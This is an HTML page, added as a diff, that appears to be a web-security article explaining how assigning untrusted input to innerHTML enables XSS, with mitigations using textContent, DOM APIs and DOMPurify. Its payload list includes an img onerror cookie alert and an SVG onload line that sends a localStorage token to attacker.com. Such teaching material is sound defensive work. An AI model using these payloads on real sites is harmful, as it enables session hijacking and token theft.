@@ -1,0 +1,179 @@
+<!DOCTYPE html>
+<html lang="en" data-theme="light">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Why innerHTML Exposes Applications to XSS - html</title>
+    <meta name="description" content="Directly assigning untrusted data to the innerHTML property exposes web applications to Cross-Site Scripting (XSS) by forcing the browser to parse input strings as executable markup rather than plain text. When an application renders unsanitized user-con">
+    <link rel="canonical" href="https://salivity.github.io/html/article/why-innerhtml-exposes-applications-to-xss">
+    <link rel="search" type="application/opensearchdescription+xml" title="html" href="/html/opensearch.xml">
+    <link rel="icon" href="/html/favicon.ico">
+    <link rel="stylesheet" href="/html/css/style.css">
+    <link media="print" rel="stylesheet" href="/html/css/print.css">
+    <script src="/html/js/fuse.min.js"></script>
+    <script src="/html/js/script.js"></script>
+    <script id="MathJax-script" src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/4.1.3/tex-chtml.min.js" defer></script>
+    <script src="/monetize/monetize.js"></script>
+    <script src="/social/social.js"></script>
+    <meta property="og:type" content="website" />
+    <meta property="og:title" content="Why innerHTML Exposes Applications to XSS - html" />
+    <meta property="og:url" content="https://salivity.github.io/html/article/why-innerhtml-exposes-applications-to-xss" />
+    <meta property="og:image:url" content="https://salivity.github.io/html/images/open-graph/default.webp" />
+    <meta property="og:image:secure_url" content="https://salivity.github.io/html/images/open-graph/default.webp" />
+    <meta property="og:image:width" content="1120" />
+    <meta property="og:image:height" content="630" />
+    <meta property="og:description" content="Directly assigning untrusted data to the innerHTML property exposes web applications to Cross-Site Scripting (XSS) by forcing the browser to parse input strings as executable markup rather than plain text. When an application renders unsanitized user-con" />
+    <link rel="manifest" href="/html/pwa/manifest.json" />
+</head>
+<body>
+    <header>
+        <a href="/html/" aria-label="Go To Home Page" title="Go To Home Page" id="logo">
+            <span>salivity.github.io/</span><span>html</span>
+        </a>
+        <nav>
+            <ul class="header-links">
+                <li><a href="/html/search" title="Search" aria-label="Go To Search Page"><svg class="svg-icon" aria-hidden="true" focusable="false" viewBox="0 0 24 24"><path d="M15.5 14h-.79l-.28-.27C15.41 12.59 16 11.11 16 9.5 16 5.91 13.09 3 9.5 3S3 5.91 3 9.5 5.91 16 9.5 16c1.61 0 3.09-.59 4.23-1.57l.27.28v.79l5 4.99L20.49 19zm-6 0C7.01 14 5 11.99 5 9.5S7.01 5 9.5 5 14 7.01 14 9.5 11.99 14 9.5 14"></path></svg></a></li>
+                <li><a id="theme-toggle" title="Theme" href="javascript:void(0);" aria-label="Toggle Website Theme"></a></li>
+            </ul>
+        </nav>
+    </header>
+    <main>
+        <article><h1 id="why-innerhtml-exposes-applications-to-xss">Why innerHTML Exposes
+Applications to XSS</h1>
+<p>Directly assigning untrusted data to the <code>innerHTML</code>
+property exposes web applications to Cross-Site Scripting (XSS) by
+forcing the browser to parse input strings as executable markup rather
+than plain text. When an application renders unsanitized user-controlled
+input using <code>innerHTML</code>, an attacker can inject malicious
+HTML and JavaScript code into the Document Object Model (DOM). This
+article explains how the browser's HTML parser interprets these
+assignments, why standard defenses fail, and how developers can prevent
+XSS by adopting secure DOM manipulation practices.</p>
+<h3 id="how-innerhtml-processes-data">How innerHTML Processes Data</h3>
+<p>The <code>innerHTML</code> property is designed to get or set the
+HTML markup contained within an element. When a string is assigned to
+<code>element.innerHTML</code>, the browser does not treat the content
+as literal text. Instead, it invokes its built-in HTML parser to convert
+the raw string into DOM nodes and integrates them directly into the live
+document tree.</p>
+<p>If the assigned string contains valid HTML syntax, the browser
+constructs elements based on those tags. If the string contains plain
+text, the browser treats it as text nodes. The fundamental security
+issue arises when an application handles untrusted input—such as URL
+parameters, form fields, or database records provided by users—and
+assumes it is harmless text, while the parser interprets it as
+executable markup.</p>
+<h3 id="the-execution-mechanism-of-injected-code">The Execution
+Mechanism of Injected Code</h3>
+<p>A common misconception is that <code>innerHTML</code> is inherently
+safe against script execution because modern HTML5 specifications
+dictate that <code>&lt;script&gt;</code> tags inserted via
+<code>innerHTML</code> should not execute. While modern browsers adhere
+to this rule, attackers easily bypass it using inline event handlers and
+elements that trigger script execution upon rendering or failing to
+load.</p>
+<p>Common payload vectors include:</p>
+<ul>
+<li><strong>Image error handlers:</strong>
+<code>&lt;img src="invalid-source" onerror="alert(document.cookie)"&gt;</code></li>
+<li><strong>SVG vectors:</strong>
+<code>&lt;svg onload="fetch('https://attacker.com/steal?data=' + localStorage.getItem('token'))"&gt;</code></li>
+<li><strong>Body or input autofocus triggers:</strong>
+<code>&lt;input autofocus onfocus="maliciousFunction()"&gt;</code></li>
+</ul>
+<p>Because the HTML parser processes these elements immediately upon
+their insertion into the document, the event handlers fire automatically
+without requiring any user interaction. Once the injected script
+executes, the attacker gains the full privileges of the authenticated
+user within the context of the vulnerable application.</p>
+<h3 id="the-impact-of-an-xss-exploitation">The Impact of an XSS
+Exploitation</h3>
+<p>When an attacker successfully injects code via
+<code>innerHTML</code>, the malicious script runs with the same origin
+privileges as the legitimate application. Consequences include:</p>
+<ul>
+<li><strong>Session Hijacking:</strong> Stealing session tokens,
+authorization headers, or sensitive data stored in
+<code>localStorage</code> or <code>sessionStorage</code>.</li>
+<li><strong>Credential Harvesting:</strong> Dynamically altering the DOM
+to inject fake login forms or prompt users for sensitive
+credentials.</li>
+<li><strong>Unauthorized Actions:</strong> Executing API requests on
+behalf of the victim, such as modifying account details, transferring
+funds, or changing passwords.</li>
+<li><strong>Defacement and Redirection:</strong> Overwriting the page
+content or redirecting users to malicious external domains.</li>
+</ul>
+<h3 id="how-to-mitigate-innerhtml-xss-risks">How to Mitigate innerHTML
+XSS Risks</h3>
+<p>Securing an application against <code>innerHTML</code>-based XSS
+requires ensuring that untrusted data is never parsed as markup or that
+the markup is strictly sanitized before assignment.</p>
+<h4 id="1-use-safe-text-properties">1. Use Safe Text Properties</h4>
+<p>When the goal is to render plain text, avoid <code>innerHTML</code>
+entirely. Use <code>textContent</code> or <code>innerText</code>. These
+properties instruct the browser to treat the input exclusively as a
+literal string, rendering any HTML tags inert without executing
+them:</p>
+<div class="sourceCode" id="cb1"><pre
+class="sourceCode javascript"><code class="sourceCode javascript"><span id="cb1-1"><a href="#cb1-1" aria-hidden="true" tabindex="-1"></a><span class="co">// Vulnerable</span></span>
+<span id="cb1-2"><a href="#cb1-2" aria-hidden="true" tabindex="-1"></a>element<span class="op">.</span><span class="at">innerHTML</span> <span class="op">=</span> userInput<span class="op">;</span></span>
+<span id="cb1-3"><a href="#cb1-3" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb1-4"><a href="#cb1-4" aria-hidden="true" tabindex="-1"></a><span class="co">// Secure</span></span>
+<span id="cb1-5"><a href="#cb1-5" aria-hidden="true" tabindex="-1"></a>element<span class="op">.</span><span class="at">textContent</span> <span class="op">=</span> userInput<span class="op">;</span></span></code></pre></div>
+<h4 id="2-construct-elements-using-dom-apis">2. Construct Elements Using
+DOM APIs</h4>
+<p>If dynamically creating elements is necessary, use explicit DOM
+methods such as <code>document.createElement()</code>,
+<code>setAttribute()</code>, and <code>appendChild()</code>. These
+programmatic methods do not invoke the string parser:</p>
+<div class="sourceCode" id="cb2"><pre
+class="sourceCode javascript"><code class="sourceCode javascript"><span id="cb2-1"><a href="#cb2-1" aria-hidden="true" tabindex="-1"></a><span class="kw">const</span> newDiv <span class="op">=</span> <span class="bu">document</span><span class="op">.</span><span class="fu">createElement</span>(<span class="st">&#39;div&#39;</span>)<span class="op">;</span></span>
+<span id="cb2-2"><a href="#cb2-2" aria-hidden="true" tabindex="-1"></a>newDiv<span class="op">.</span><span class="at">textContent</span> <span class="op">=</span> userInput<span class="op">;</span></span>
+<span id="cb2-3"><a href="#cb2-3" aria-hidden="true" tabindex="-1"></a>parentElement<span class="op">.</span><span class="fu">appendChild</span>(newDiv)<span class="op">;</span></span></code></pre></div>
+<h4 id="3-sanitize-input-when-html-is-required">3. Sanitize Input When
+HTML Is Required</h4>
+<p>When an application genuinely requires rendering rich text (such as
+Markdown previews or styled text), the input must pass through an
+established, actively maintained HTML sanitizer like DOMPurify before
+assignment. Sanitization strips away dangerous tags
+(<code>&lt;script&gt;</code>, <code>&lt;iframe&gt;</code>,
+<code>&lt;object&gt;</code>) and removes executable attributes
+(<code>onerror</code>, <code>onload</code>, <code>javascript:</code>
+URLs) while preserving safe structural markup:</p>
+<div class="sourceCode" id="cb3"><pre
+class="sourceCode javascript"><code class="sourceCode javascript"><span id="cb3-1"><a href="#cb3-1" aria-hidden="true" tabindex="-1"></a><span class="co">// Secure rich-text rendering</span></span>
+<span id="cb3-2"><a href="#cb3-2" aria-hidden="true" tabindex="-1"></a>element<span class="op">.</span><span class="at">innerHTML</span> <span class="op">=</span> DOMPurify<span class="op">.</span><span class="fu">sanitize</span>(userProvidedHtml)<span class="op">;</span></span></code></pre></div></article>
+        <div id="comments-container"></div>
+
+        <script>
+            const utterancesScript = document.createElement('script');
+            
+            utterancesScript.setAttribute('src', 'https://utteranc.es/client.js');
+            utterancesScript.setAttribute('repo', 'salivity/html'); 
+            utterancesScript.setAttribute('issue-term', 'pathname'); 
+            utterancesScript.setAttribute('theme', localStorage.getItem('theme') === 'dark' ? 'github-dark' : 'github-light'); 
+            utterancesScript.setAttribute('crossorigin', 'anonymous');
+            utterancesScript.async = true;
+
+            document.getElementById('comments-container').appendChild(utterancesScript);
+        </script>
+    
+    </main>
+    <footer>
+        <nav>
+            <ul class="social-links">
+            </ul>
+        </nav>
+        <nav>
+            <ul class="footer-links">
+                <li><a href="/html/privacy-policy">Privacy Policy</a></li>
+                <li><a href="/html/terms-and-conditions">Terms and Conditions</a></li>
+            </ul>
+        </nav>
+        <div class="copyright">
+            Copyright &copy; <span id="current-year"></span>
+        </div>
+    </footer>
+</body>
+</html>
